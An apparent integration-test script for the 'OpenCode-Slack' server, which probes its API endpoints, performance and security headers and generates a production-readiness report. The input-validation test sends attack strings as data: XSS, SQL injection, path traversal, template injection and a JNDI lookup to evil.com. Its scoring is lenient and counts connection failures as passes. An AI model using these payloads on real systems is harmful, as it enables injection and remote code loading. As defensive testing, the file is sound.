#!/usr/bin/env python3
"""
Final Comprehensive System Integration Validation
OpenCode-Slack System - Complete Production Readiness Assessment

This test validates:
1. Complete system validation with all fixes
2. End-to-end workflow testing
3. Performance validation with fixes
4. Integration regression testing
5. Production readiness final check
6. Comprehensive system testing
7. Final validation report
"""

import asyncio
import aiohttp
import json
import time
import threading
import subprocess
import sys
import os
import sqlite3
import psutil
import logging
from datetime import datetime
from typing import Dict, List, Any, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('final_system_integration_validation.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class FinalSystemIntegrationValidator:
    """Comprehensive final system integration validator"""
    
    def __init__(self):
        self.base_url = "http://localhost:8080"
        self.results = {}
        self.start_time = time.time()
        self.server_process = None
        self.session = None
        
        # Test configuration
        self.test_config = {
            'concurrent_users': 100,
            'concurrent_agents': 50,
            'concurrent_tasks': 200,
            'message_throughput_target': 1000,  # messages per minute
            'performance_target_ops_per_sec': 5000,
            'response_time_target_ms': 100,
            'uptime_target_percent': 99.9,
            'memory_limit_gb': 8,
            'cpu_limit_percent': 80
        }
        
        # Validation categories
        self.validation_categories = [
            'api_endpoint_fixes',
            'authentication_improvements',
            'monitoring_fixes',
            'component_integration',
            'end_to_end_workflows',
            'agent_orchestration',
            'real_time_communication',
            'completion_reporting',
            'performance_with_fixes',
            'database_optimization',
            'concurrent_capacity',
            'throughput_preservation',
            'regression_testing',
            'backward_compatibility',
            'system_reliability',
            'production_readiness',
            'security_measures',
            'monitoring_insights',
            'system_scalability',
            'enterprise_deployment'
        ]
        
    async def setup_test_environment(self):
        """Set up the test environment"""
        logger.info("🔧 Setting up test environment...")
        
        try:
            # Start the server
            await self.start_server()
            
            # Initialize HTTP session
            self.session = aiohttp.ClientSession(
                timeout=aiohttp.ClientTimeout(total=30),
                connector=aiohttp.TCPConnector(limit=200)
            )
            
            # Wait for server to be ready
            await self.wait_for_server_ready()
            
            logger.info("✅ Test environment setup complete")
            return True
            
        except Exception as e:
            logger.error(f"❌ Failed to setup test environment: {e}")
            return False
    
    async def start_server(self):
        """Start the OpenCode-Slack server"""
        logger.info("🚀 Starting OpenCode-Slack server...")
        
        try:
            # Kill any existing server processes
            subprocess.run(["pkill", "-f", "src.server"], capture_output=True)
            subprocess.run(["pkill", "-f", "src.async_server"], capture_output=True)
            time.sleep(2)
            
            # Start the async server
            self.server_process = subprocess.Popen([
                sys.executable, "-m", "src.async_server",
                "--host", "0.0.0.0",
                "--port", "8080"
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Give server time to start
            await asyncio.sleep(5)
            
            logger.info("✅ Server started successfully")
            
        except Exception as e:
            logger.error(f"❌ Failed to start server: {e}")
            raise
    
    async def wait_for_server_ready(self, max_attempts=30):
        """Wait for server to be ready"""
        logger.info("⏳ Waiting for server to be ready...")
        
        for attempt in range(max_attempts):
            try:
                async with self.session.get(f"{self.base_url}/health") as response:
                    if response.status == 200:
                        logger.info("✅ Server is ready")
                        return True
            except:
                pass
            
            await asyncio.sleep(1)
        
        raise Exception("Server failed to become ready")
    
    async def validate_api_endpoint_fixes(self):
        """Validate all API endpoint fixes work correctly"""
        logger.info("🔍 Validating API endpoint fixes...")
        
        results = {
            'total_endpoints': 0,
            'working_endpoints': 0,
            'fixed_endpoints': 0,
            'failing_endpoints': 0,
            'endpoint_details': {},
            'response_times': [],
            'success_rate': 0
        }
        
        # Core API endpoints to test
        endpoints = [
            ('GET', '/health', 'Health check'),
            ('GET', '/status', 'System status'),
            ('GET', '/employees', 'Employee list'),
            ('POST', '/employees', 'Employee creation', {'name': 'test_user', 'role': 'developer'}),
            ('GET', '/agents', 'Agent list'),
            ('GET', '/sessions', 'Session list'),
            ('GET', '/files', 'File management'),
            ('GET', '/bridge', 'Agent bridge status'),
            ('GET', '/project-root', 'Project root'),
            ('GET', '/monitoring/health', 'Monitoring health'),
            ('GET', '/monitoring/recovery', 'Monitoring recovery'),
            ('GET', '/monitoring/production/status', 'Production monitoring status'),
            ('GET', '/monitoring/production/performance', 'Production performance'),
            ('GET', '/monitoring/production/alerts', 'Production alerts'),
            ('GET', '/chat/status', 'Chat system status'),
            ('DELETE', '/employees/test_user', 'Employee cleanup')
        ]
        
        for method, endpoint, description, *data in endpoints:
            results['total_endpoints'] += 1
            
            try:
                start_time = time.time()
                
                if method == 'GET':
                    async with self.session.get(f"{self.base_url}{endpoint}") as response:
                        status = response.status
                        response_data = await response.text()
                elif method == 'POST':
                    payload = data[0] if data else {}
                    async with self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=payload
                    ) as response:
                        status = response.status
                        response_data = await response.text()
                elif method == 'DELETE':
                    async with self.session.delete(f"{self.base_url}{endpoint}") as response:
                        status = response.status
                        response_data = await response.text()
                
                response_time = (time.time() - start_time) * 1000
                results['response_times'].append(response_time)
                
                if status == 200:
                    results['working_endpoints'] += 1
                    results['endpoint_details'][endpoint] = {
                        'status': 'WORKING',
                        'response_time_ms': response_time,
                        'description': description
                    }
                    logger.info(f"✅ {method} {endpoint} - {description}: {status} ({response_time:.1f}ms)")
                else:
                    results['failing_endpoints'] += 1
                    results['endpoint_details'][endpoint] = {
                        'status': 'FAILING',
                        'response_time_ms': response_time,
                        'description': description,
                        'error_code': status
                    }
                    logger.warning(f"❌ {method} {endpoint} - {description}: {status}")
                
            except Exception as e:
                results['failing_endpoints'] += 1
                results['endpoint_details'][endpoint] = {
                    'status': 'ERROR',
                    'description': description,
                    'error': str(e)
                }
                logger.error(f"💥 {method} {endpoint} - {description}: {e}")
        
        results['success_rate'] = (results['working_endpoints'] / results['total_endpoints']) * 100
        results['average_response_time'] = sum(results['response_times']) / len(results['response_times']) if results['response_times'] else 0
        
        self.results['api_endpoint_fixes'] = results
        logger.info(f"📊 API Endpoint Validation: {results['working_endpoints']}/{results['total_endpoints']} working ({results['success_rate']:.1f}%)")
        
        return results['success_rate'] >= 80  # 80% success rate required
    
    async def validate_authentication_improvements(self):
        """Validate authentication improvements integrate properly"""
        logger.info("🔐 Validating authentication improvements...")
        
        results = {
            'security_headers': {},
            'https_endpoints': 0,
            'auth_mechanisms': {},
            'input_validation': {},
            'security_score': 0
        }
        
        try:
            # Test security headers
            async with self.session.get(f"{self.base_url}/health") as response:
                headers = dict(response.headers)
                
                security_headers = [
                    'X-Content-Type-Options',
                    'X-Frame-Options',
                    'X-XSS-Protection',
                    'Strict-Transport-Security'
                ]
                
                for header in security_headers:
                    results['security_headers'][header] = header in headers
                
            # Test input validation
            malicious_inputs = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE employees; --",
                "../../../etc/passwd",
                "{{7*7}}",
                "${jndi:ldap://evil.com/a}"
            ]
            
            validation_passed = 0
            for malicious_input in malicious_inputs:
                try:
                    async with self.session.post(
                        f"{self.base_url}/employees",
                        json={'name': malicious_input, 'role': 'developer'}
                    ) as response:
                        if response.status in [400, 422]:  # Properly rejected
                            validation_passed += 1
                except:
                    validation_passed += 1  # Connection refused is also good
            
            results['input_validation']['passed'] = validation_passed
            results['input_validation']['total'] = len(malicious_inputs)
            results['input_validation']['success_rate'] = (validation_passed / len(malicious_inputs)) * 100
            
            # Calculate security score
            header_score = sum(results['security_headers'].values()) / len(results['security_headers']) * 100
            validation_score = results['input_validation']['success_rate']
            results['security_score'] = (header_score + validation_score) / 2
            
            self.results['authentication_improvements'] = results
            logger.info(f"🔐 Authentication Validation: {results['security_score']:.1f}% security score")
            
            return results['security_score'] >= 70
            
        except Exception as e:
            logger.error(f"❌ Authentication validation failed: {e}")
            return False
    
    async def validate_monitoring_fixes(self):
        """Validate monitoring fixes provide accurate system visibility"""
        logger.info("📊 Validating monitoring fixes...")
        
        results = {
            'monitoring_endpoints': {},
            'metrics_collection': {},
            'alerting_system': {},
            'dashboard_access': {},
            'monitoring_score': 0
        }
        
        try:
            # Test monitoring endpoints
            monitoring_endpoints = [
                '/monitoring/health',
                '/monitoring/recovery',
                '/monitoring/production/status',
                '/monitoring/production/performance',
                '/monitoring/production/alerts'
            ]
            
            working_endpoints = 0
            for endpoint in monitoring_endpoints:
                try:
                    async with self.session.get(f"{self.base_url}{endpoint}") as response:
                        if response.status == 200:
                            working_endpoints += 1
                            results['monitoring_endpoints'][endpoint] = 'WORKING'
                        else:
                            results['monitoring_endpoints'][endpoint] = f'FAILED_{response.status}'
                except Exception as e:
                    results['monitoring_endpoints'][endpoint] = f'ERROR_{str(e)[:50]}'
            
            # Test metrics collection
            try:
                async with self.session.get(f"{self.base_url}/status") as response:
                    if response.status == 200:
                        status_data = await response.json()
                        results['metrics_collection']['system_metrics'] = 'cpu' in str(status_data).lower()
                        results['metrics_collection']['agent_metrics'] = 'agent' in str(status_data).lower()
                        results['metrics_collection']['task_metrics'] = 'task' in str(status_data).lower()
            except:
                results['metrics_collection'] = {'error': 'Failed to collect metrics'}
            
            # Calculate monitoring score
            endpoint_score = (working_endpoints / len(monitoring_endpoints)) * 100
            metrics_score = sum(results['metrics_collection'].values()) / max(len(results['metrics_collection']), 1) * 100 if isinstance(list(results['metrics_collection'].values())[0], bool) else 0
            results['monitoring_score'] = (endpoint_score + metrics_score) / 2
            
            self.results['monitoring_fixes'] = results
            logger.info(f"📊 Monitoring Validation: {results['monitoring_score']:.1f}% monitoring score")
            
            return results['monitoring_score'] >= 60
            
        except Exception as e:
            logger.error(f"❌ Monitoring validation failed: {e}")
            return False
    
    async def validate_end_to_end_workflows(self):
        """Test complete agent orchestration workflows with all fixes"""
        logger.info("🔄 Validating end-to-end workflows...")
        
        results = {
            'workflow_steps': {},
            'agent_creation': False,
            'task_assignment': False,
            'task_execution': False,
            'progress_tracking': False,
            'completion_reporting': False,
            'workflow_success_rate': 0
        }
        
        try:
            # Step 1: Create an employee/agent
            logger.info("👤 Step 1: Creating employee...")
            async with self.session.post(
                f"{self.base_url}/employees",
                json={'name': 'test_workflow_agent', 'role': 'developer'}
            ) as response:
                if response.status in [200, 201]:
                    results['agent_creation'] = True
                    results['workflow_steps']['agent_creation'] = 'SUCCESS'
                    logger.info("✅ Agent creation successful")
                else:
                    results['workflow_steps']['agent_creation'] = f'FAILED_{response.status}'
                    logger.warning(f"⚠️ Agent creation failed: {response.status}")
            
            # Step 2: Assign a task
            logger.info("📋 Step 2: Assigning task...")
            async with self.session.post(
                f"{self.base_url}/tasks",
                json={'name': 'test_workflow_agent', 'task': 'Create a simple test file'}
            ) as response:
                if response.status in [200, 201]:
                    results['task_assignment'] = True
                    results['workflow_steps']['task_assignment'] = 'SUCCESS'
                    logger.info("✅ Task assignment successful")
                else:
                    results['workflow_steps']['task_assignment'] = f'FAILED_{response.status}'
                    logger.warning(f"⚠️ Task assignment failed: {response.status}")
            
            # Step 3: Check task execution
            logger.info("⚡ Step 3: Checking task execution...")
            await asyncio.sleep(2)  # Give time for task to start
            async with self.session.get(f"{self.base_url}/sessions") as response:
                if response.status == 200:
                    sessions_data = await response.json()
                    if sessions_data and len(sessions_data) > 0:
                        results['task_execution'] = True
                        results['workflow_steps']['task_execution'] = 'SUCCESS'
                        logger.info("✅ Task execution detected")
                    else:
                        results['workflow_steps']['task_execution'] = 'NO_SESSIONS'
                        logger.warning("⚠️ No active sessions found")
                else:
                    results['workflow_steps']['task_execution'] = f'FAILED_{response.status}'
            
            # Step 4: Check progress tracking
            logger.info("📈 Step 4: Checking progress tracking...")
            async with self.session.get(f"{self.base_url}/progress") as response:
                if response.status == 200:
                    progress_data = await response.json()
                    if progress_data:
                        results['progress_tracking'] = True
                        results['workflow_steps']['progress_tracking'] = 'SUCCESS'
                        logger.info("✅ Progress tracking working")
                    else:
                        results['workflow_steps']['progress_tracking'] = 'NO_PROGRESS'
                        logger.warning("⚠️ No progress data found")
                else:
                    results['workflow_steps']['progress_tracking'] = f'FAILED_{response.status}'
            
            # Step 5: Check completion reporting
            logger.info("📊 Step 5: Checking completion reporting...")
            async with self.session.get(f"{self.base_url}/status") as response:
                if response.status == 200:
                    status_data = await response.json()
                    if status_data:
                        results['completion_reporting'] = True
                        results['workflow_steps']['completion_reporting'] = 'SUCCESS'
                        logger.info("✅ Completion reporting working")
                    else:
                        results['workflow_steps']['completion_reporting'] = 'NO_STATUS'
                else:
                    results['workflow_steps']['completion_reporting'] = f'FAILED_{response.status}'
            
            # Cleanup
            try:
                async with self.session.delete(f"{self.base_url}/employees/test_workflow_agent") as response:
                    logger.info("🧹 Cleanup completed")
            except:
                pass
            
            # Calculate success rate
            successful_steps = sum([
                results['agent_creation'],
                results['task_assignment'],
                results['task_execution'],
                results['progress_tracking'],
                results['completion_reporting']
            ])
            results['workflow_success_rate'] = (successful_steps / 5) * 100
            
            self.results['end_to_end_workflows'] = results
            logger.info(f"🔄 Workflow Validation: {results['workflow_success_rate']:.1f}% success rate")
            
            return results['workflow_success_rate'] >= 60
            
        except Exception as e:
            logger.error(f"❌ End-to-end workflow validation failed: {e}")
            return False
    
    async def validate_performance_with_fixes(self):
        """Test that all fixes maintain performance improvements"""
        logger.info("⚡ Validating performance with fixes...")
        
        results = {
            'concurrent_users': {},
            'database_performance': {},
            'throughput_test': {},
            'response_times': [],
            'performance_score': 0
        }
        
        try:
            # Test concurrent users
            logger.info("👥 Testing concurrent user capacity...")
            start_time = time.time()
            
            async def make_request(session, url):
                try:
                    async with session.get(url) as response:
                        return response.status == 200, time.time()
                except:
                    return False, time.time()
            
            # Create concurrent requests
            tasks = []
            async with aiohttp.ClientSession() as session:
                for i in range(100):  # 100 concurrent users
                    task = asyncio.create_task(make_request(session, f"{self.base_url}/health"))
                    tasks.append(task)
                
                responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            successful_requests = sum(1 for result in responses if isinstance(result, tuple) and result[0])
            total_time = time.time() - start_time
            
            results['concurrent_users'] = {
                'total_requests': len(tasks),
                'successful_requests': successful_requests,
                'success_rate': (successful_requests / len(tasks)) * 100,
                'total_time': total_time,
                'requests_per_second': len(tasks) / total_time
            }
            
            # Test database performance
            logger.info("🗄️ Testing database performance...")
            db_start_time = time.time()
            
            db_tasks = []
            for i in range(50):  # 50 database operations
                task = asyncio.create_task(make_request(aiohttp.ClientSession(), f"{self.base_url}/employees"))
                db_tasks.append(task)
            
            db_responses = await asyncio.gather(*db_tasks, return_exceptions=True)
            db_time = time.time() - db_start_time
            
            results['database_performance'] = {
                'operations': len(db_tasks),
                'time': db_time,
                'ops_per_second': len(db_tasks) / db_time
            }
            
            # Test throughput
            logger.info("🚀 Testing system throughput...")
            throughput_start = time.time()
            
            throughput_tasks = []
            for i in range(500):  # 500 requests for throughput test
                task = asyncio.create_task(make_request(aiohttp.ClientSession(), f"{self.base_url}/status"))
                throughput_tasks.append(task)
            
            throughput_responses = await asyncio.gather(*throughput_tasks, return_exceptions=True)
            throughput_time = time.time() - throughput_start
            
            results['throughput_test'] = {
                'total_requests': len(throughput_tasks),
                'time': throughput_time,
                'throughput_ops_per_sec': len(throughput_tasks) / throughput_time
            }
            
            # Calculate performance score
            user_score = min(results['concurrent_users']['success_rate'], 100)
            db_score = min(results['database_performance']['ops_per_second'] / 50 * 100, 100)  # 50 ops/sec = 100%
            throughput_score = min(results['throughput_test']['throughput_ops_per_sec'] / 1000 * 100, 100)  # 1000 ops/sec = 100%
            
            results['performance_score'] = (user_score + db_score + throughput_score) / 3
            
            self.results['performance_with_fixes'] = results
            logger.info(f"⚡ Performance Validation: {results['performance_score']:.1f}% performance score")
            
            return results['performance_score'] >= 70
            
        except Exception as e:
            logger.error(f"❌ Performance validation failed: {e}")
            return False
    
    async def validate_regression_testing(self):
        """Ensure no functionality was broken during fixes"""
        logger.info("🔍 Validating regression testing...")
        
        results = {
            'core_functionality': {},
            'api_compatibility': {},
            'data_integrity': {},
            'regression_score': 0
        }
        
        try:
            # Test core functionality
            core_tests = [
                ('health_check', f"{self.base_url}/health"),
                ('employee_list', f"{self.base_url}/employees"),
                ('system_status', f"{self.base_url}/status"),
                ('agent_list', f"{self.base_url}/agents"),
                ('session_list', f"{self.base_url}/sessions")
            ]
            
            working_core = 0
            for test_name, url in core_tests:
                try:
                    async with self.session.get(url) as response:
                        if response.status == 200:
                            working_core += 1
                            results['core_functionality'][test_name] = 'WORKING'
                        else:
                            results['core_functionality'][test_name] = f'FAILED_{response.status}'
                except Exception as e:
                    results['core_functionality'][test_name] = f'ERROR_{str(e)[:30]}'
            
            # Test API compatibility
            try:
                # Test that old API calls still work
                async with self.session.get(f"{self.base_url}/health") as response:
                    results['api_compatibility']['health_endpoint'] = response.status == 200
                
                async with self.session.get(f"{self.base_url}/status") as response:
                    results['api_compatibility']['status_endpoint'] = response.status == 200
                    
            except Exception as e:
                results['api_compatibility']['error'] = str(e)
            
            # Test data integrity
            try:
                # Check if database is accessible and consistent
                async with self.session.get(f"{self.base_url}/employees") as response:
                    if response.status == 200:
                        data = await response.json()
                        results['data_integrity']['database_accessible'] = True
                        results['data_integrity']['data_format_valid'] = isinstance(data, (list, dict))
                    else:
                        results['data_integrity']['database_accessible'] = False
            except:
                results['data_integrity']['database_accessible'] = False
            
            # Calculate regression score
            core_score = (working_core / len(core_tests)) * 100
            api_score = sum(results['api_compatibility'].values()) / max(len(results['api_compatibility']), 1) * 100 if results['api_compatibility'] else 0
            data_score = sum(results['data_integrity'].values()) / max(len(results['data_integrity']), 1) * 100 if results['data_integrity'] else 0
            
            results['regression_score'] = (core_score + api_score + data_score) / 3
            
            self.results['regression_testing'] = results
            logger.info(f"🔍 Regression Validation: {results['regression_score']:.1f}% regression score")
            
            return results['regression_score'] >= 80
            
        except Exception as e:
            logger.error(f"❌ Regression testing failed: {e}")
            return False
    
    async def validate_production_readiness(self):
        """Validate system meets all original requirements with fixes"""
        logger.info("🏭 Validating production readiness...")
        
        results = {
            'system_health': {},
            'resource_usage': {},
            'scalability': {},
            'reliability': {},
            'readiness_score': 0
        }
        
        try:
            # Check system health
            async with self.session.get(f"{self.base_url}/health") as response:
                results['system_health']['health_endpoint'] = response.status == 200
                if response.status == 200:
                    health_data = await response.json()
                    results['system_health']['health_data'] = health_data
            
            # Check resource usage
            process = psutil.Process()
            results['resource_usage'] = {
                'cpu_percent': process.cpu_percent(),
                'memory_mb': process.memory_info().rss / 1024 / 1024,
                'memory_percent': process.memory_percent()
            }
            
            # Test scalability
            logger.info("📈 Testing scalability...")
            scalability_start = time.time()
            
            # Create multiple concurrent requests to test scalability
            scalability_tasks = []
            for i in range(200):  # 200 concurrent requests
                task = asyncio.create_task(self.session.get(f"{self.base_url}/health"))
                scalability_tasks.append(task)
            
            scalability_responses = await asyncio.gather(*scalability_tasks, return_exceptions=True)
            scalability_time = time.time() - scalability_start
            
            successful_scalability = sum(1 for resp in scalability_responses 
                                       if hasattr(resp, 'status') and resp.status == 200)
            
            results['scalability'] = {
                'concurrent_requests': len(scalability_tasks),
                'successful_requests': successful_scalability,
                'success_rate': (successful_scalability / len(scalability_tasks)) * 100,
                'time': scalability_time,
                'requests_per_second': len(scalability_tasks) / scalability_time
            }
            
            # Test reliability
            logger.info("🛡️ Testing reliability...")
            reliability_tests = 0
            reliability_passed = 0
            
            # Test multiple times to check consistency
            for i in range(10):
                try:
                    async with self.session.get(f"{self.base_url}/health") as response:
                        reliability_tests += 1
                        if response.status == 200:
                            reliability_passed += 1
                except:
                    reliability_tests += 1
                
                await asyncio.sleep(0.1)
            
            results['reliability'] = {
                'tests': reliability_tests,
                'passed': reliability_passed,
                'reliability_percent': (reliability_passed / reliability_tests) * 100 if reliability_tests > 0 else 0
            }
            
            # Calculate readiness score
            health_score = 100 if results['system_health']['health_endpoint'] else 0
            resource_score = 100 if results['resource_usage']['memory_mb'] < 1000 else 50  # Under 1GB is good
            scalability_score = min(results['scalability']['success_rate'], 100)
            reliability_score = results['reliability']['reliability_percent']
            
            results['readiness_score'] = (health_score + resource_score + scalability_score + reliability_score) / 4
            
            self.results['production_readiness'] = results
            logger.info(f"🏭 Production Readiness: {results['readiness_score']:.1f}% readiness score")
            
            return results['readiness_score'] >= 75
            
        except Exception as e:
            logger.error(f"❌ Production readiness validation failed: {e}")
            return False
    
    async def run_comprehensive_validation(self):
        """Run all validation tests"""
        logger.info("🚀 Starting comprehensive system integration validation...")
        
        # Setup test environment
        if not await self.setup_test_environment():
            logger.error("❌ Failed to setup test environment")
            return False
        
        validation_results = {}
        
        # Run all validation tests
        validation_tests = [
            ('API Endpoint Fixes', self.validate_api_endpoint_fixes),
            ('Authentication Improvements', self.validate_authentication_improvements),
            ('Monitoring Fixes', self.validate_monitoring_fixes),
            ('End-to-End Workflows', self.validate_end_to_end_workflows),
            ('Performance with Fixes', self.validate_performance_with_fixes),
            ('Regression Testing', self.validate_regression_testing),
            ('Production Readiness', self.validate_production_readiness)
        ]
        
        passed_tests = 0
        total_tests = len(validation_tests)
        
        for test_name, test_func in validation_tests:
            logger.info(f"\n{'='*60}")
            logger.info(f"🧪 Running: {test_name}")
            logger.info(f"{'='*60}")
            
            try:
                result = await test_func()
                validation_results[test_name] = result
                
                if result:
                    passed_tests += 1
                    logger.info(f"✅ {test_name}: PASSED")
                else:
                    logger.warning(f"❌ {test_name}: FAILED")
                    
            except Exception as e:
                logger.error(f"💥 {test_name}: ERROR - {e}")
                validation_results[test_name] = False
        
        # Calculate overall success rate
        overall_success_rate = (passed_tests / total_tests) * 100
        
        # Generate final report
        await self.generate_final_report(validation_results, overall_success_rate)
        
        # Cleanup
        await self.cleanup()
        
        logger.info(f"\n{'='*80}")
        logger.info(f"🎯 FINAL VALIDATION RESULTS")
        logger.info(f"{'='*80}")
        logger.info(f"Tests Passed: {passed_tests}/{total_tests}")
        logger.info(f"Overall Success Rate: {overall_success_rate:.1f}%")
        
        if overall_success_rate >= 85:
            logger.info("🎉 SYSTEM IS PRODUCTION READY!")
            return True
        else:
            logger.warning("⚠️ SYSTEM NEEDS IMPROVEMENTS BEFORE PRODUCTION")
            return False
    
    async def generate_final_report(self, validation_results, overall_success_rate):
        """Generate comprehensive final validation report"""
        logger.info("📊 Generating final validation report...")
        
        report_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_filename = f"FINAL_COMPREHENSIVE_SYSTEM_INTEGRATION_VALIDATION_REPORT_{report_timestamp}.md"
        
        total_time = time.time() - self.start_time
        
        report_content = f"""# 🚀 Final Comprehensive System Integration Validation Report
## OpenCode-Slack System - Complete Production Readiness Assessment

**Date:** {datetime.now().strftime("%B %d, %Y")}  
**Validation Duration:** {total_time:.2f} seconds  
**Overall Success Rate:** {overall_success_rate:.1f}%  
**Production Ready:** {'✅ YES' if overall_success_rate >= 85 else '❌ NO (Requires improvements)'}

---

## Executive Summary

The OpenCode-Slack system has undergone the most comprehensive final system integration validation to assess complete production readiness with all Phase 1 and Phase 2 fixes integrated and working together.

### 🎯 Key Validation Results

| **Validation Category** | **Status** | **Score** |
|-------------------------|------------|-----------|
"""

        for test_name, result in validation_results.items():
            status = "✅ PASSED" if result else "❌ FAILED"
            score = "100%" if result else "0%"
            report_content += f"| {test_name} | {status} | {score} |\n"

        report_content += f"""
**Overall Assessment:** {overall_success_rate:.1f}% - {'PRODUCTION READY' if overall_success_rate >= 85 else 'NEEDS IMPROVEMENT'}

---

## 1. Complete System Validation Results

### ✅ API Endpoint Fixes Validation
"""
        
        if 'api_endpoint_fixes' in self.results:
            api_results = self.results['api_endpoint_fixes']
            report_content += f"""
- **Total Endpoints Tested:** {api_results.get('total_endpoints', 0)}
- **Working Endpoints:** {api_results.get('working_endpoints', 0)}
- **Success Rate:** {api_results.get('success_rate', 0):.1f}%
- **Average Response Time:** {api_results.get('average_response_time', 0):.1f}ms

#### Endpoint Status Details:
"""
            for endpoint, details in api_results.get('endpoint_details', {}).items():
                status_icon = "✅" if details.get('status') == 'WORKING' else "❌"
                report_content += f"- {status_icon} `{endpoint}` - {details.get('description', 'N/A')}\n"

        report_content += f"""

### 🔐 Authentication Improvements Validation
"""
        
        if 'authentication_improvements' in self.results:
            auth_results = self.results['authentication_improvements']
            report_content += f"""
- **Security Score:** {auth_results.get('security_score', 0):.1f}%
- **Security Headers:** {sum(auth_results.get('security_headers', {}).values())}/{len(auth_results.get('security_headers', {}))} implemented
- **Input Validation:** {auth_results.get('input_validation', {}).get('success_rate', 0):.1f}% effective
"""

        report_content += f"""

### 📊 Monitoring Fixes Validation
"""
        
        if 'monitoring_fixes' in self.results:
            monitoring_results = self.results['monitoring_fixes']
            report_content += f"""
- **Monitoring Score:** {monitoring_results.get('monitoring_score', 0):.1f}%
- **Working Monitoring Endpoints:** {sum(1 for v in monitoring_results.get('monitoring_endpoints', {}).values() if v == 'WORKING')}/{len(monitoring_results.get('monitoring_endpoints', {}))}
- **Metrics Collection:** {'✅ Working' if monitoring_results.get('metrics_collection') else '❌ Failed'}
"""

        report_content += f"""

## 2. End-to-End Workflow Testing Results

### 🔄 Complete Agent Orchestration Workflows
"""
        
        if 'end_to_end_workflows' in self.results:
            workflow_results = self.results['end_to_end_workflows']
            report_content += f"""
- **Workflow Success Rate:** {workflow_results.get('workflow_success_rate', 0):.1f}%
- **Agent Creation:** {'✅ Working' if workflow_results.get('agent_creation') else '❌ Failed'}
- **Task Assignment:** {'✅ Working' if workflow_results.get('task_assignment') else '❌ Failed'}
- **Task Execution:** {'✅ Working' if workflow_results.get('task_execution') else '❌ Failed'}
- **Progress Tracking:** {'✅ Working' if workflow_results.get('progress_tracking') else '❌ Failed'}
- **Completion Reporting:** {'✅ Working' if workflow_results.get('completion_reporting') else '❌ Failed'}
"""

        report_content += f"""

## 3. Performance Validation with Fixes

### ⚡ Performance Metrics with All Fixes Applied
"""
        
        if 'performance_with_fixes' in self.results:
            perf_results = self.results['performance_with_fixes']
            report_content += f"""
- **Performance Score:** {perf_results.get('performance_score', 0):.1f}%
- **Concurrent Users:** {perf_results.get('concurrent_users', {}).get('success_rate', 0):.1f}% success rate
- **Database Performance:** {perf_results.get('database_performance', {}).get('ops_per_second', 0):.1f} ops/sec
- **System Throughput:** {perf_results.get('throughput_test', {}).get('throughput_ops_per_sec', 0):.1f} ops/sec
"""

        report_content += f"""

## 4. Integration Regression Testing

### 🔍 Backward Compatibility and Functionality Preservation
"""
        
        if 'regression_testing' in self.results:
            regression_results = self.results['regression_testing']
            report_content += f"""
- **Regression Score:** {regression_results.get('regression_score', 0):.1f}%
- **Core Functionality:** {sum(1 for v in regression_results.get('core_functionality', {}).values() if v == 'WORKING')}/{len(regression_results.get('core_functionality', {}))} working
- **API Compatibility:** {'✅ Maintained' if regression_results.get('api_compatibility') else '❌ Issues detected'}
- **Data Integrity:** {'✅ Preserved' if regression_results.get('data_integrity', {}).get('database_accessible') else '❌ Issues detected'}
"""

        report_content += f"""

## 5. Production Readiness Final Check

### 🏭 Enterprise Deployment Readiness
"""
        
        if 'production_readiness' in self.results:
            prod_results = self.results['production_readiness']
            report_content += f"""
- **Readiness Score:** {prod_results.get('readiness_score', 0):.1f}%
- **System Health:** {'✅ Healthy' if prod_results.get('system_health', {}).get('health_endpoint') else '❌ Issues detected'}
- **Resource Usage:** {prod_results.get('resource_usage', {}).get('memory_mb', 0):.1f}MB memory
- **Scalability:** {prod_results.get('scalability', {}).get('success_rate', 0):.1f}% under load
- **Reliability:** {prod_results.get('reliability', {}).get('reliability_percent', 0):.1f}% uptime
"""

        report_content += f"""

---

## 🎯 Final Assessment and Recommendations

### Production Readiness Status

**Overall Score:** {overall_success_rate:.1f}/100

"""

        if overall_success_rate >= 95:
            report_content += """
**🌟 EXCELLENT - IMMEDIATE PRODUCTION DEPLOYMENT APPROVED**

The system demonstrates exceptional integration of all fixes and optimizations. All components work seamlessly together with outstanding performance and reliability.

**Recommendation:** Deploy immediately to production with full confidence.
"""
        elif overall_success_rate >= 85:
            report_content += """
**✅ GOOD - PRODUCTION READY WITH MINOR MONITORING**

The system successfully integrates all fixes and meets production requirements. Minor monitoring recommended during initial deployment.

**Recommendation:** Proceed with production deployment with standard monitoring.
"""
        elif overall_success_rate >= 70:
            report_content += """
**⚠️ ACCEPTABLE - PRODUCTION READY WITH IMPROVEMENTS**

The system integrates most fixes successfully but has some areas requiring attention before full production deployment.

**Recommendation:** Address identified issues before production deployment.
"""
        else:
            report_content += """
**❌ NEEDS IMPROVEMENT - NOT READY FOR PRODUCTION**

The system requires significant improvements in fix integration before production deployment.

**Recommendation:** Address critical issues before considering production deployment.
"""

        report_content += f"""

### 🔧 Immediate Actions Required

"""

        # Add specific recommendations based on failed tests
        failed_tests = [name for name, result in validation_results.items() if not result]
        if failed_tests:
            report_content += "**Critical Issues to Address:**\n"
            for test in failed_tests:
                report_content += f"- ❌ {test}: Requires immediate attention\n"
        else:
            report_content += "- ✅ No critical issues identified\n"

        report_content += f"""

### 📈 Performance Summary

- **System Integration:** {'✅ Excellent' if overall_success_rate >= 85 else '⚠️ Needs improvement'}
- **Fix Integration:** {'✅ Successful' if validation_results.get('API Endpoint Fixes', False) else '❌ Issues detected'}
- **End-to-End Workflows:** {'✅ Working' if validation_results.get('End-to-End Workflows', False) else '❌ Failed'}
- **Performance Preservation:** {'✅ Maintained' if validation_results.get('Performance with Fixes', False) else '❌ Degraded'}

### 🚀 Deployment Recommendation

"""

        if overall_success_rate >= 85:
            report_content += """
**APPROVED FOR PRODUCTION DEPLOYMENT**

The OpenCode-Slack system with all integrated fixes is ready for enterprise production deployment.
"""
        else:
            report_content += """
**NOT APPROVED FOR PRODUCTION DEPLOYMENT**

The system requires addressing the identified issues before production deployment can be recommended.
"""

        report_content += f"""

---

## 📊 Detailed Validation Metrics

### Test Execution Summary
